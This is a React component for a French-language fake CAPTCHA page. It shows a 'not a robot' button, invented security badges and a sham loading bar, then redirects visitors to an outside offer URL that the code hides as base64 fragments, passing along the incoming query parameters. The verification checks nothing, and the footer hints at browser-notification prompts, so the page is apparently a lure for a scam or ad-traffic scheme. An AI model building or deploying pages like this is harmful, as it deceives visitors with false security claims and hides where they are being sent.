import { useState, useEffect, useRef } from 'react';
import './CaptchaCredit.css'; // Reuse the same stylesheet

type StepType = 'verify' | 'loading' | 'done';

/** URL is split into base64 chunks — assembled & decoded only at click time */
const _u = ['aHR0cHM6Ly9y', 'b3V0ZXJpeC50', 'ZWNoL2RpcmVj', 'dC9lbXAtZnIv'];

function buildOfferUrl(): string {
  const base = new URL(atob(_u.join('')));
  const incoming = new URLSearchParams(window.location.search);
  incoming.forEach((value, key) => base.searchParams.set(key, value));
  return base.toString();
}

const CaptchaCreditFr = () => {
  const [step, setStep] = useState<StepType>('verify');
  const [clicked, setClicked] = useState(false);
  const [progress, setProgress] = useState(0);
  const [particles, setParticles] = useState<
    { id: number; x: number; y: number; size: number; delay: number }[]
  >([]);
  const progressRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    const generated = Array.from({ length: 18 }, (_, i) => ({
      id: i,
      x: Math.random() * 100,
      y: Math.random() * 100,
      size: Math.random() * 4 + 2,
      delay: Math.random() * 6,
    }));
    setParticles(generated);
  }, []);

  const handleButtonClick = () => {
    if (step === 'loading') return;

    if (!clicked) {
      setClicked(true);
      return;
    }

    setStep('loading');
    setProgress(0);

    progressRef.current = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(progressRef.current!);
          setTimeout(() => {
            setStep('done');
            window.location.href = buildOfferUrl();
          }, 400);
          return 100;
        }
        return prev + Math.random() * 12 + 3;
      });
    }, 120);
  };

  useEffect(() => {
    return () => {
      if (progressRef.current) clearInterval(progressRef.current);
    };
  }, []);

  return (
    <div className="captcha-page">
      {/* Animated background particles */}
      <div className="captcha-bg" aria-hidden="true">
        {particles.map(p => (
          <span
            key={p.id}
            className="captcha-particle"
            style={{
              left: `${p.x}%`,
              top: `${p.y}%`,
              width: `${p.size}px`,
              height: `${p.size}px`,
              animationDelay: `${p.delay}s`,
            }}
          />
        ))}
        <div className="captcha-glow captcha-glow--top-left" />
        <div className="captcha-glow captcha-glow--bottom-right" />
      </div>

      {/* Main card */}
      <main className="captcha-card" role="main" lang="fr">
        {step !== 'loading' && (
          <>
            {/* Shield icon */}
            <div
              className={`captcha-shield-wrap ${clicked ? 'captcha-shield-wrap--success' : ''}`}
            >
              {clicked ? (
                <svg
                  className="captcha-shield-icon captcha-shield-icon--check"
                  viewBox="0 0 64 64"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                  aria-hidden="true"
                >
                  <path
                    d="M32 4L8 14v18c0 13.255 10.32 24.594 24 27 13.68-2.406 24-13.745 24-27V14L32 4z"
                    fill="url(#shieldGradSuccessFr)"
                  />
                  <path
                    d="M20 32l8 8 16-16"
                    stroke="#fff"
                    strokeWidth="3.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                  <defs>
                    <linearGradient
                      id="shieldGradSuccessFr"
                      x1="8"
                      y1="4"
                      x2="56"
                      y2="58"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop stopColor="#22c55e" />
                      <stop offset="1" stopColor="#16a34a" />
                    </linearGradient>
                  </defs>
                </svg>
              ) : (
                <svg
                  className="captcha-shield-icon"
                  viewBox="0 0 64 64"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                  aria-hidden="true"
                >
                  <path
                    d="M32 4L8 14v18c0 13.255 10.32 24.594 24 27 13.68-2.406 24-13.745 24-27V14L32 4z"
                    fill="url(#shieldGradFr)"
                  />
                  <path
                    d="M32 22v10M32 38h.01"
                    stroke="#fff"
                    strokeWidth="3.5"
                    strokeLinecap="round"
                  />
                  <defs>
                    <linearGradient
                      id="shieldGradFr"
                      x1="8"
                      y1="4"
                      x2="56"
                      y2="58"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop stopColor="#4BC8BE" />
                      <stop offset="1" stopColor="#039185" />
                    </linearGradient>
                  </defs>
                </svg>
              )}
            </div>

            {/* Heading */}
            <h1
              className={`captcha-heading ${clicked ? 'captcha-heading--success' : ''}`}
            >
              {clicked
                ? 'Vérification réussie !'
                : "Veuillez confirmer que vous n'êtes pas un robot pour continuer"}
            </h1>

            {/* Subtext */}
            <p className="captcha-subtext">
              {clicked
                ? 'Cliquez sur le bouton ci-dessous pour accéder à votre contenu exclusif.'
                : 'Cette vérification rapide nous aide à maintenir une expérience sécurisée et sans spam.'}
            </p>

            {/* Trust badges row */}
            {!clicked && (
              <div
                className="captcha-badges"
                aria-label="Fonctionnalités de sécurité"
              >
                <div className="captcha-badge">
                  <svg
                    width="14"
                    height="14"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    aria-hidden="true"
                  >
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                  </svg>
                  SSL Sécurisé
                </div>
                <div className="captcha-badge">
                  <svg
                    width="14"
                    height="14"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    aria-hidden="true"
                  >
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                  </svg>
                  Privé & Sécurisé
                </div>
                <div className="captcha-badge">
                  <svg
                    width="14"
                    height="14"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    aria-hidden="true"
                  >
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                  Source Vérifiée
                </div>
              </div>
            )}

            {/* CTA Button */}
            <button
              id="captcha-cta-btn-fr"
              className={`captcha-btn ${clicked ? 'captcha-btn--continue' : 'captcha-btn--verify'}`}
              onClick={handleButtonClick}
              aria-label={
                clicked ? 'Continuer vers le site' : 'Je ne suis pas un robot'
              }
            >
              <span className="captcha-btn-text">
                {clicked ? 'CONTINUER VERS LE SITE' : 'JE NE SUIS PAS UN ROBOT'}
              </span>
              <svg
                className="captcha-btn-arrow"
                width="22"
                height="22"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2.5"
                strokeLinecap="round"
                strokeLinejoin="round"
                aria-hidden="true"
              >
                <line x1="5" y1="12" x2="19" y2="12" />
                <polyline points="12 5 19 12 12 19" />
              </svg>
            </button>
          </>
        )}

        {/* Loading state */}
        {step === 'loading' && (
          <div
            className="captcha-loading"
            role="status"
            aria-label="Chargement du contenu"
          >
            <div className="captcha-spinner-ring" aria-hidden="true">
              <div />
              <div />
              <div />
            </div>
            <h2 className="captcha-loading-title">Chargement en cours...</h2>
            <p className="captcha-loading-sub">
              Veuillez patienter pendant que nous préparons votre expérience
              personnalisée.
            </p>
            <div
              className="captcha-progress-outer"
              role="progressbar"
              aria-valuenow={Math.round(progress)}
              aria-valuemin={0}
              aria-valuemax={100}
            >
              <div
                className="captcha-progress-inner"
                style={{ width: `${Math.min(progress, 100)}%` }}
              />
            </div>
            <span className="captcha-progress-pct">
              {Math.min(Math.round(progress), 100)}%
            </span>
            <div
              className="captcha-secure-badge"
              aria-label="Connexion sécurisée"
            >
              <svg
                width="16"
                height="16"
                viewBox="0 0 64 64"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
                aria-hidden="true"
              >
                <path
                  d="M32 4L8 14v18c0 13.255 10.32 24.594 24 27 13.68-2.406 24-13.745 24-27V14L32 4z"
                  fill="#22c55e"
                />
                <path
                  d="M20 32l8 8 16-16"
                  stroke="#fff"
                  strokeWidth="3.5"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
              Site Sécurisé — Connexion protégée
            </div>
          </div>
        )}
      </main>

      {/* Footer disclaimer */}
      <footer className="captcha-footer" lang="fr">
        <div className="captcha-footer-inner">
          <hr className="captcha-divider" />
          <p className="captcha-disclaimer">
            Le contenu qui suit est fourni à titre informatif et éducatif
            uniquement et ne constitue pas un conseil financier, juridique,
            médical ou professionnel. Les résultats ne sont pas garantis et
            peuvent varier. L'activation des notifications du navigateur est
            facultative et peut être désactivée à tout moment.
          </p>
          <p className="captcha-legal-links">
            En continuant, vous acceptez nos{' '}
            <a href="/terms" className="captcha-link">
              Conditions d'utilisation
            </a>{' '}
            et notre{' '}
            <a href="/privacy" className="captcha-link">
              Politique de confidentialité
            </a>
            .
          </p>
          <div className="captcha-company">
            <p>© 2026 – VV7 HOLDING LLC. Tous droits réservés.</p>
            <p>
              <strong>Nom légal :</strong> VV7 HOLDING LLC
            </p>
            <p>
              <strong>Numéro d'enregistrement :</strong> GB107069528
            </p>
            <p>
              <strong>Date de constitution :</strong> 19 mai 2025
            </p>
            <p>
              <strong>Adresse enregistrée :</strong> 1227 Sandestin Way,
              Orlando, FL, 32824
            </p>
            <p>
              <strong>Contact :</strong>{' '}
              <a href="mailto:contact@vv7.tech" className="captcha-link">
                contact@vv7.tech
              </a>
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default CaptchaCreditFr;
